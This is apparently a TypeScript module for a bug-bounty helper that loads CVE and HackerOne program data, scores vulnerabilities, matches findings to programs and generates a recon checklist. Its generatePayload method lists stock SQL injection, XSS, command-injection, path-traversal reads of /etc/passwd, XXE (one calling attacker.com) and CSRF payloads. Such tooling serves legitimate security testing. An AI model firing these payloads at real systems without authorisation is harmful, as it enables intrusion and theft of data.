/**
 * HackerOne Vulnerability Assessment Assistant
 *
 * Specializes in evaluating security findings and matching them with HackerOne programs
 * Phase 3c: Advanced security specialization for bug bounty hunting
 */

import fs from 'fs';
import path from 'path';

interface CVE {
  id: string;
  cvss_score: number;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  affected_software: string[];
  vulnerability_type: string;
  techniques: string[];
  exploitation_difficulty: string;
  bounty_range: { min: number; max: number };
}

interface VulnerabilityTechnique {
  type: string;
  name: string;
  severity: string;
  description: string;
  exploitation_methods: any[];
  detection_methods: string[];
  mitigation_strategies: string[];
  affected_cves: string[];
}

interface HackerOneProgram {
  program_id: string;
  name: string;
  scope: {
    domains: string[];
    in_scope_vulnerabilities: string[];
  };
  bounty_range: { min: number; max: number };
  accepts_vulnerability_types: string[];
  average_payout: number;
  recent_acceptance_rate: number;
}

interface SecurityFinding {
  type: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  confidence: number;
  description: string;
  affected_component: string;
  exploitation_difficulty: string;
  impact: string;
  evidence?: string;
}

interface VulnerabilityAssessment {
  severity: string;
  cvss_score?: number;
  impact: string;
  exploitation_steps: string[];
  detection_methods: string[];
  techniques: string[];
}

interface ProgramMatch {
  program_name: string;
  scope_match: boolean;
  bounty_range: { min: number; max: number };
  average_payout: number;
  acceptance_probability: number;
  reasons: string[];
}

export class HackerOneAssistant {
  private cveDatabase: CVE[] = [];
  private vulnerabilityTechniques: Map<string, VulnerabilityTechnique> = new Map();
  private hackerOnePrograms: HackerOneProgram[] = [];
  private dataPath: string;

  constructor() {
    this.dataPath = path.join(__dirname, 'data');
    console.log(`🔍 HackerOneAssistant - Data path: ${this.dataPath}`);
    this.loadDatabases();
  }

  /**
   * Load CVE database, vulnerability techniques, and HackerOne programs
   */
  private loadDatabases(): void {
    try {
      // Load CVE database
      const cveDbPath = path.join(this.dataPath, 'cve-database.json');
      console.log(`📂 Checking CVE database at: ${cveDbPath}`);
      if (fs.existsSync(cveDbPath)) {
        const cveData = JSON.parse(fs.readFileSync(cveDbPath, 'utf-8'));
        this.cveDatabase = cveData.cves || [];
        console.log(`✅ CVE database loaded: ${this.cveDatabase.length} CVEs`);
        // Validate first CVE
        if (this.cveDatabase.length > 0) {
          console.log(`📋 First CVE structure:`, JSON.stringify(this.cveDatabase[0]).substring(0, 200));
        }
      } else {
        console.log(`❌ CVE database file not found at ${cveDbPath}`);
      }

      // Load vulnerability techniques
      const techPath = path.join(this.dataPath, 'vulnerability-techniques.json');
      if (fs.existsSync(techPath)) {
        const techData = JSON.parse(fs.readFileSync(techPath, 'utf-8'));
        (techData.techniques || []).forEach((tech: VulnerabilityTechnique) => {
          this.vulnerabilityTechniques.set(tech.type, tech);
        });
      }

      // Load HackerOne programs
      const programsPath = path.join(this.dataPath, 'hackerone-programs.json');
      if (fs.existsSync(programsPath)) {
        const programsData = JSON.parse(fs.readFileSync(programsPath, 'utf-8'));
        this.hackerOnePrograms = programsData.programs || [];
      }

      console.log(`✅ HackerOne Assistant databases loaded:`);
      console.log(`   - ${this.cveDatabase.length} CVEs`);
      console.log(`   - ${this.vulnerabilityTechniques.size} vulnerability techniques`);
      console.log(`   - ${this.hackerOnePrograms.length} HackerOne programs`);
    } catch (error) {
      console.error('❌ Error loading HackerOne databases:', error);
    }
  }

  /**
   * Assess a vulnerability with full analysis
   */
  assessVulnerability(vulnType: string, targetSoftware?: string): VulnerabilityAssessment {
    // Input validation
    if (!vulnType) {
      console.error('❌ assessVulnerability: vulnType is required');
      throw new Error('vulnerabilityType es requerido');
    }

    console.log(`🔍 Assessing vulnerability: ${vulnType}`);
    console.log(`📊 CVE Database size: ${this.cveDatabase.length}`);

    // Search for relevant CVEs
    const relevantCVEs = this.cveDatabase.filter(cve => {
      try {
        const hasVulnType = cve.vulnerability_type && cve.vulnerability_type.toLowerCase().includes(vulnType.toLowerCase());
        const hasTechnique = cve.techniques && cve.techniques.some(t => t && t.toLowerCase().includes(vulnType.toLowerCase()));
        const hasSoftware = targetSoftware && cve.affected_software && cve.affected_software.some(s => s && s.toLowerCase().includes(targetSoftware.toLowerCase()));
        return hasVulnType || hasTechnique || hasSoftware;
      } catch (e) {
        console.error(`⚠️  Error filtering CVE ${cve.id}:`, e);
        return false;
      }
    });

    // Get vulnerability technique details
    const vulnKey = Array.from(this.vulnerabilityTechniques.keys()).find(
      key => key.toLowerCase().includes(vulnType.toLowerCase())
    );
    const technique = vulnKey ? this.vulnerabilityTechniques.get(vulnKey) : null;

    // Determine severity
    const severity = relevantCVEs.length > 0
      ? relevantCVEs[0].severity
      : technique?.severity || 'medium';

    // Calculate average CVSS
    const avgCVSS = relevantCVEs.length > 0
      ? relevantCVEs.reduce((sum, cve) => sum + cve.cvss_score, 0) / relevantCVEs.length
      : 5.0;

    // Collect exploitation steps
    const exploitSteps = technique?.exploitation_methods
      ? technique.exploitation_methods.map((m: any) => m.description)
      : relevantCVEs[0]?.exploitation_steps || [];

    return {
      severity,
      cvss_score: avgCVSS,
      impact: this.calculateImpact(vulnType, severity),
      exploitation_steps: exploitSteps,
      detection_methods: technique?.detection_methods || [],
      techniques: relevantCVEs.map(cve => cve.techniques).flat()
    };
  }

  /**
   * Generate payload variations for a vulnerability type
   */
  generatePayload(vulnType: string, targetTech?: string): string[] {
    const payloads: string[] = [];

    switch (vulnType.toLowerCase()) {
      case 'sql-injection':
      case 'sqli':
        payloads.push(
          "' OR '1'='1",
          "' OR 1=1--",
          "' UNION SELECT NULL--",
          "' AND SLEEP(5)--",
          "admin' #"
        );
        if (targetTech?.toLowerCase().includes('mysql')) {
          payloads.push("' UNION SELECT version(),user(),database()--");
        }
        break;

      case 'xss':
      case 'cross-site-scripting':
        payloads.push(
          "<script>alert('XSS')</script>",
          "<img src=x onerror=\"alert('XSS')\">",
          "<svg onload=\"alert('XSS')\">",
          "\"><script>alert('XSS')</script>",
          "javascript:alert('XSS')"
        );
        break;

      case 'rce':
      case 'remote-code-execution':
        payloads.push(
          "; whoami",
          "| id",
          "&& cat /etc/passwd",
          "` whoami `",
          "$(whoami)"
        );
        break;

      case 'lfi':
      case 'local-file-inclusion':
        payloads.push(
          "../../../etc/passwd",
          "..\\..\\..\\windows\\win.ini",
          "php://filter/convert.base64-encode/resource=index.php",
          "....//....//....//etc/passwd"
        );
        break;

      case 'xxe':
      case 'xml-external-entity':
        payloads.push(
          '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
          '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]>',
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/resource=/etc/passwd">]>'
        );
        break;

      case 'csrf':
      case 'cross-site-request-forgery':
        payloads.push(
          '<img src="http://target.com/transfer?to=attacker&amount=1000">',
          '<iframe src="http://target.com/admin/delete?id=1"></iframe>',
          '<form action="http://target.com/change" method="POST"><input type="hidden" name="password" value="hacked"></form>'
        );
        break;

      default:
        payloads.push('Generic payload - adjust based on vulnerability type');
    }

    return payloads;
  }

  /**
   * Find HackerOne programs interested in this vulnerability
   */
  findApplicablePrograms(vulnType: string, severity?: string): ProgramMatch[] {
    const matches: ProgramMatch[] = [];
    const normalizedType = vulnType.toLowerCase().replace(/\s+/g, '-');

    for (const program of this.hackerOnePrograms) {
      // Check if program accepts this vulnerability type
      const acceptsType = program.accepts_vulnerability_types.some(vt =>
        vt.toLowerCase().includes(normalizedType) || normalizedType.includes(vt.toLowerCase())
      );

      if (!acceptsType) continue;

      // Check severity minimum requirement
      const severityLevel = { low: 1, medium: 2, high: 3, critical: 4 };
      const vulnSeverity = severity ? severityLevel[severity as keyof typeof severityLevel] : 3;

      // Calculate acceptance probability based on severity and acceptance rate
      let probability = program.recent_acceptance_rate;
      if (severity === 'critical') probability *= 1.2;
      else if (severity === 'high') probability *= 1.1;
      probability = Math.min(probability, 1.0);

      matches.push({
        program_name: program.name,
        scope_match: true,
        bounty_range: program.bounty_range,
        average_payout: program.average_payout,
        acceptance_probability: probability,
        reasons: [
          `Accepts ${vulnType} vulnerabilities`,
          `Average payout: $${program.average_payout}`,
          `Bounty range: $${program.bounty_range.min}-${program.bounty_range.max}`
        ]
      });
    }

    // Sort by probability and payout
    return matches.sort((a, b) => {
      if (b.acceptance_probability !== a.acceptance_probability) {
        return b.acceptance_probability - a.acceptance_probability;
      }
      return b.average_payout - a.average_payout;
    });
  }

  /**
   * Match a security finding against HackerOne programs
   */
  matchProgramsForFinding(finding: SecurityFinding): ProgramMatch[] {
    const matches = this.findApplicablePrograms(finding.type, finding.severity);

    // Boost ranking based on confidence
    return matches.map(match => ({
      ...match,
      acceptance_probability: match.acceptance_probability * finding.confidence
    }));
  }

  /**
   * Generate reconnaissance checklist
   */
  generateReconChecklist(target: string): string[] {
    const checklist = [
      `[*] Target: ${target}`,
      `[*] Phase 1: Information Gathering`,
      `  [ ] DNS enumeration`,
      `  [ ] Whois lookup`,
      `  [ ] CNAME/A record enumeration`,
      `  [ ] Subdomain discovery (DNS, certificate transparency)`,
      `[*] Phase 2: Web Application Analysis`,
      `  [ ] Technology fingerprinting (Wappalyzer)`,
      `  [ ] Directory/file enumeration`,
      `  [ ] API endpoints discovery`,
      `  [ ] Hidden parameters detection`,
      `[*] Phase 3: Vulnerability Assessment`,
      `  [ ] SQL Injection testing`,
      `  [ ] XSS testing (Reflected, Stored, DOM)`,
      `  [ ] CSRF testing`,
      `  [ ] Authentication bypass attempts`,
      `  [ ] Authorization bypass (IDOR)`,
      `[*] Phase 4: Advanced Testing`,
      `  [ ] Business logic flaws`,
      `  [ ] Race conditions`,
      `  [ ] XXE/XPath Injection`,
      `  [ ] Template Injection`,
      `[*] Phase 5: Exploitation & Reporting`,
      `  [ ] Confirm vulnerability exploitation`,
      `  [ ] Measure impact`,
      `  [ ] Generate proof of concept`,
      `  [ ] Document findings`
    ];

    return checklist;
  }

  /**
   * Calculate impact score based on vulnerability type
   */
  private calculateImpact(vulnType: string, severity: string): string {
    const baseImpact: { [key: string]: string } = {
      'sql-injection': 'Unauthorized database access, data extraction, authentication bypass',
      'rce': 'Complete system compromise, malware installation, data theft',
      'xss': 'Session hijacking, credential theft, malware distribution',
      'lfi': 'Source code disclosure, system file access, RCE via log poisoning',
      'xxe': 'XXE attacks, SSRF, Denial of Service, information disclosure',
      'csrf': 'Unauthorized actions on behalf of users, account compromise',
      'authentication-bypass': 'Unauthorized access, account takeover, privilege escalation',
      'default': 'Varies based on vulnerability type and exploitation'
    };

    let impact = baseImpact[vulnType.toLowerCase()] || baseImpact['default'];

    if (severity === 'critical') {
      impact = `[CRITICAL] ${impact}`;
    } else if (severity === 'high') {
      impact = `[HIGH] ${impact}`;
    }

    return impact;
  }

  /**
   * Get detailed vulnerability information
   */
  getVulnerabilityDetails(vulnType: string): VulnerabilityTechnique | null {
    const key = Array.from(this.vulnerabilityTechniques.keys()).find(
      k => k.toLowerCase().includes(vulnType.toLowerCase())
    );
    return key ? this.vulnerabilityTechniques.get(key) || null : null;
  }

  /**
   * Search CVE database
   */
  searchCVEs(query: string): CVE[] {
    return this.cveDatabase.filter(cve =>
      cve.description.toLowerCase().includes(query.toLowerCase()) ||
      cve.id.toLowerCase().includes(query.toLowerCase()) ||
      cve.affected_software.some(s => s.toLowerCase().includes(query.toLowerCase()))
    );
  }

  /**
   * Get statistics
   */
  getStats(): object {
    return {
      total_cves: this.cveDatabase.length,
      total_techniques: this.vulnerabilityTechniques.size,
      total_programs: this.hackerOnePrograms.length,
      average_bounty: Math.round(
        this.hackerOnePrograms.reduce((sum, p) => sum + p.average_payout, 0) / this.hackerOnePrograms.length
      ),
      total_potential_bounty: this.hackerOnePrograms.reduce((sum, p) => sum + p.bounty_range.max, 0)
    };
  }
}

// Singleton instance
export const hackerOneAssistant = new HackerOneAssistant();
